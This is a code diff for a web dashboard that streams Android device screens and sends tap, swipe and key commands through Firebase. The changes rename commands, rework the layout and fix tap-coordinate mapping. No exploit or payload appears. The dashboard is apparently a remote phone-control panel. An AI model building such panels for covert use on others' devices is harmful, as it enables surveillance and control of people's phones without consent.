@@ -798,7 +798,7 @@ async function sendScreenTapControl({
   const controlPayload =
     action === 'swipe'
       ? {
-          action: 'swipe',
+          action: 'SWIPE',
           startX: Math.round(startX),
           startY: Math.round(startY),
           endX: Math.round(endX),
@@ -811,13 +811,13 @@ async function sendScreenTapControl({
         }
       : action === 'key'
         ? {
-            action: 'key',
+            action: 'KEY',
             key: cleanText(key, 32).toUpperCase(),
             status: 'pending',
             timestamp: now,
           }
         : {
-            action: 'tap',
+            action: 'TAP',
             x: Math.round(x),
             y: Math.round(y),
             xPercent: Number(Number(xPercent).toFixed(4)),
@@ -830,10 +830,10 @@ async function sendScreenTapControl({
 
   const commandName =
     action === 'swipe'
-      ? 'SCREEN_SWIPE'
+      ? 'SWIPE'
       : action === 'key'
         ? `KEY_${cleanText(key, 32).toUpperCase()}`
-        : 'SCREEN_TAP';
+        : 'TAP';
 
   try {
     await set(ref(rtdb, controlPath), controlPayload);
@@ -1803,21 +1803,21 @@ function renderLiveScreenView() {
   const ctrl = state.screenControl;
   const tapMarker = state.lastTapMarker;
   const mode = state.screenControlMode;
-  const updatedText = sc?.updatedAt ? new Date(Number(sc.updatedAt)).toLocaleTimeString() : 'Waiting';
+  const updatedText = sc?.updatedAt ? new Date(Number(sc.updatedAt)).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : 'Waiting';
 
   return `
-    <div class="min-h-full bg-[#040a07] flex flex-col">
-      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-2.5 border-b border-slate-800 flex items-center justify-between gap-2">
+    <div class="h-full min-h-0 bg-[#040a07] flex flex-col overflow-hidden">
+      <div class="shrink-0 bg-[#040a07]/95 backdrop-blur-md px-3 sm:px-4 py-2 border-b border-slate-800 flex items-center justify-between gap-2">
         <div class="min-w-0">
-          <h2 class="text-sm font-bold text-white truncate">Live Screen &amp; Tap Control</h2>
-          <p class="text-[11px] font-mono-tabular text-slate-400 truncate">${esc(devicePath(state.activeUid, 'screen'))} · ${esc(updatedText)}</p>
+          <h2 class="text-xs sm:text-sm font-bold text-white truncate">Live Screen Control</h2>
+          <p class="text-[10px] sm:text-[11px] font-mono-tabular text-slate-400 truncate">${esc(devicePath(state.activeUid, 'screen'))} · ${esc(updatedText)}</p>
         </div>
         <div class="flex items-center gap-1.5 shrink-0">
           <button
             type="button"
             data-send-upload-cmd="CAPTURE_SCREEN"
             data-upload-target="screen"
-            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 hover:bg-cyan-500/25 rounded-lg cursor-pointer"
+            class="px-2 sm:px-2.5 py-1 sm:py-1.5 text-[10px] sm:text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 hover:bg-cyan-500/25 rounded-lg cursor-pointer"
           >
             ↻ Capture
           </button>
@@ -1825,110 +1825,112 @@ function renderLiveScreenView() {
             type="button"
             data-send-upload-cmd="${sc?.streaming ? 'STOP_SCREEN_STREAM' : 'START_SCREEN_STREAM'}"
             data-upload-target="screen"
-            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold ${sc?.streaming ? 'bg-red-500/20 border-red-400/40 text-red-300' : 'bg-emerald-500/15 border-emerald-500/35 text-emerald-300'} border rounded-lg cursor-pointer"
+            class="px-2 sm:px-2.5 py-1 sm:py-1.5 text-[10px] sm:text-[11px] font-mono-tabular font-semibold ${sc?.streaming ? 'bg-red-500/20 border-red-400/40 text-red-300' : 'bg-emerald-500/15 border-emerald-500/35 text-emerald-300'} border rounded-lg cursor-pointer"
           >
             ${sc?.streaming ? '■ Stop' : '▶ Stream'}
           </button>
         </div>
       </div>
 
-      <div class="p-3 sm:p-4 flex-1 flex flex-col items-center gap-3">
-        <div class="w-full max-w-md flex items-center justify-between gap-2 px-3 py-2 rounded-xl bg-[#07130e] border border-emerald-500/20 text-[11px] font-mono-tabular">
-          <div class="flex items-center gap-1">
+      <div class="shrink-0 px-3 pt-2 pb-1">
+        <div class="w-full max-w-md mx-auto flex items-center justify-between gap-2 px-2.5 py-1.5 rounded-xl bg-[#07130e] border border-emerald-500/20 text-[10px] sm:text-[11px] font-mono-tabular">
+          <div class="flex items-center gap-1 shrink-0">
             <button
               type="button"
               data-screen-mode="tap"
-              class="px-2.5 py-1 rounded-md cursor-pointer ${mode === 'tap' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
+              class="px-2 py-1 rounded-md cursor-pointer ${mode === 'tap' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
             >
-              Tap Mode
+              Tap
             </button>
             <button
               type="button"
               data-screen-mode="swipe"
-              class="px-2.5 py-1 rounded-md cursor-pointer ${mode === 'swipe' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
+              class="px-2 py-1 rounded-md cursor-pointer ${mode === 'swipe' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
             >
-              Swipe Mode
+              Swipe
             </button>
           </div>
-          <span class="text-emerald-300 truncate">
-            ${tapMarker ? `TAP (${tapMarker.x}, ${tapMarker.y})` : ctrl?.action ? `${String(ctrl.action).toUpperCase()} (${ctrl.x ?? ctrl.startX ?? 0}, ${ctrl.y ?? ctrl.startY ?? 0})` : 'Click screen to send tap'}
+          <span class="text-emerald-300 truncate text-right">
+            ${tapMarker ? `TAP (${tapMarker.x}, ${tapMarker.y})` : ctrl?.action ? `${String(ctrl.action).toUpperCase()} (${ctrl.x ?? ctrl.startX ?? 0}, ${ctrl.y ?? ctrl.startY ?? 0})` : 'Tap screen to control'}
           </span>
         </div>
+      </div>
 
-        <div class="w-full max-w-md flex flex-col items-center">
-          <div
-            id="remote-screen-stage"
-            class="relative w-full max-w-[360px] bg-[#020504] border-2 border-emerald-500/35 rounded-2xl overflow-hidden shadow-2xl select-none touch-none cursor-crosshair"
-            title="Tap or drag on the screen to send control coordinates to Firebase RTDB"
-          >
-            ${sc?.imageSrc ? `
-              <img
-                id="remote-screen-image"
-                src="${esc(sc.imageSrc)}"
-                alt="Live Android Device Screen"
-                draggable="false"
-                class="w-full h-auto block pointer-events-none select-none"
-              />
-              ${tapMarker ? `
-                <span
-                  class="absolute w-7 h-7 -ml-3.5 -mt-3.5 rounded-full border-2 border-emerald-400 bg-emerald-400/25 pointer-events-none animate-ping"
-                  style="left:${(tapMarker.xPercent * 100).toFixed(2)}%;top:${(tapMarker.yPercent * 100).toFixed(2)}%"
-                ></span>
-                <span
-                  class="absolute w-3.5 h-3.5 -ml-[7px] -mt-[7px] rounded-full border-2 border-white bg-emerald-400 pointer-events-none shadow"
-                  style="left:${(tapMarker.xPercent * 100).toFixed(2)}%;top:${(tapMarker.yPercent * 100).toFixed(2)}%"
-                ></span>
-              ` : ''}
-            ` : `
-              <div
-                id="remote-screen-fallback"
-                class="w-full aspect-[9/19] flex flex-col items-center justify-center p-6 text-center space-y-3"
-              >
-                <div class="w-12 h-12 rounded-2xl bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 font-mono-tabular font-bold flex items-center justify-center text-sm">
-                  B64
-                </div>
-                <div class="space-y-1">
-                  <p class="text-xs font-mono-tabular font-semibold text-emerald-300">AWAITING_BASE64_SCREEN</p>
-                  <p class="text-[11px] text-slate-400">
-                    Push a Base64 frame to <span class="font-mono-tabular text-emerald-400">${esc(devicePath(state.activeUid, 'screen'))}</span> or tap anywhere here to test sending coordinates to <span class="font-mono-tabular text-cyan-300">${esc(devicePath(state.activeUid, 'screenControl'))}</span>.
-                  </p>
-                </div>
-                ${tapMarker ? `
-                  <p class="text-[11px] font-mono-tabular text-emerald-300 bg-emerald-500/10 border border-emerald-500/30 px-2.5 py-1 rounded-lg">
-                    Last Tap Sent: (${tapMarker.x}, ${tapMarker.y}) · ${Math.round(tapMarker.xPercent * 100)}%, ${Math.round(tapMarker.yPercent * 100)}%
-                  </p>
-                ` : ''}
+      <div class="flex-1 min-h-0 w-full flex items-center justify-center px-3 py-1.5 overflow-hidden">
+        <div
+          id="remote-screen-stage"
+          class="relative inline-flex items-center justify-center max-w-full max-h-full bg-[#020504] border-2 border-emerald-500/35 rounded-2xl overflow-hidden shadow-2xl select-none touch-none cursor-crosshair"
+          title="Tap or drag on the screen to send control coordinates to Firebase RTDB"
+        >
+          ${sc?.imageSrc ? `
+            <img
+              id="remote-screen-image"
+              src="${esc(sc.imageSrc)}"
+              alt="Live Android Device Screen"
+              draggable="false"
+              class="block max-w-full max-h-[calc(100dvh-238px)] w-auto h-auto object-contain pointer-events-none select-none"
+            />
+            ${tapMarker ? `
+              <span
+                class="absolute w-7 h-7 -ml-3.5 -mt-3.5 rounded-full border-2 border-emerald-400 bg-emerald-400/25 pointer-events-none animate-ping"
+                style="left:${(tapMarker.xPercent * 100).toFixed(2)}%;top:${(tapMarker.yPercent * 100).toFixed(2)}%"
+              ></span>
+              <span
+                class="absolute w-3.5 h-3.5 -ml-[7px] -mt-[7px] rounded-full border-2 border-white bg-emerald-400 pointer-events-none shadow"
+                style="left:${(tapMarker.xPercent * 100).toFixed(2)}%;top:${(tapMarker.yPercent * 100).toFixed(2)}%"
+              ></span>
+            ` : ''}
+          ` : `
+            <div
+              id="remote-screen-fallback"
+              class="h-[min(430px,calc(100dvh-248px))] aspect-[9/19] max-w-full flex flex-col items-center justify-center p-4 text-center space-y-2.5"
+            >
+              <div class="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 font-mono-tabular font-bold flex items-center justify-center text-xs">
+                B64
               </div>
-            `}
-          </div>
+              <div class="space-y-1">
+                <p class="text-[11px] font-mono-tabular font-semibold text-emerald-300">AWAITING_BASE64_SCREEN</p>
+                <p class="text-[10px] sm:text-[11px] text-slate-400 leading-relaxed">
+                  Push Base64 to <span class="font-mono-tabular text-emerald-400 break-all">${esc(devicePath(state.activeUid, 'screen'))}</span> or tap here to test <span class="font-mono-tabular text-cyan-300">TAP</span>.
+                </p>
+              </div>
+              ${tapMarker ? `
+                <p class="text-[10px] font-mono-tabular text-emerald-300 bg-emerald-500/10 border border-emerald-500/30 px-2 py-1 rounded-lg">
+                  TAP (${tapMarker.x}, ${tapMarker.y}) · ${Math.round(tapMarker.xPercent * 100)}%, ${Math.round(tapMarker.yPercent * 100)}%
+                </p>
+              ` : ''}
+            </div>
+          `}
         </div>
+      </div>
 
-        <div class="w-full max-w-md grid grid-cols-4 gap-2">
+      <div class="shrink-0 px-3 pt-1 pb-2">
+        <div class="w-full max-w-md mx-auto grid grid-cols-4 gap-1.5 sm:gap-2">
           <button
             type="button"
             data-screen-key="BACK"
-            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
           >
             ◁ Back
           </button>
           <button
             type="button"
             data-screen-key="HOME"
-            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
           >
             ○ Home
           </button>
           <button
             type="button"
             data-screen-key="RECENTS"
-            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
           >
             □ Recents
           </button>
           <button
             type="button"
             data-screen-key="POWER"
-            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
           >
             ⏻ Wake
           </button>
@@ -2771,7 +2773,8 @@ function wireStaticListeners() {
     viewport.addEventListener('pointerdown', (e) => {
       const stage = e.target.closest('#remote-screen-stage');
       if (!stage || !state.activeUid) return;
-      const rect = stage.getBoundingClientRect();
+      const img = document.getElementById('remote-screen-image');
+      const rect = (img || stage).getBoundingClientRect();
       if (!rect.width || !rect.height) return;
       screenPointerStart = {
         clientX: e.clientX,
@@ -2787,10 +2790,10 @@ function wireStaticListeners() {
 
       const stage = document.getElementById('remote-screen-stage');
       if (!stage || !state.activeUid) return;
-      const rect = stage.getBoundingClientRect();
+      const img = document.getElementById('remote-screen-image');
+      const rect = (img || stage).getBoundingClientRect();
       if (!rect.width || !rect.height) return;
 
-      const img = document.getElementById('remote-screen-image');
       const targetWidth = state.screenData?.width || img?.naturalWidth || 1080;
       const targetHeight = state.screenData?.height || img?.naturalHeight || 2400;
 
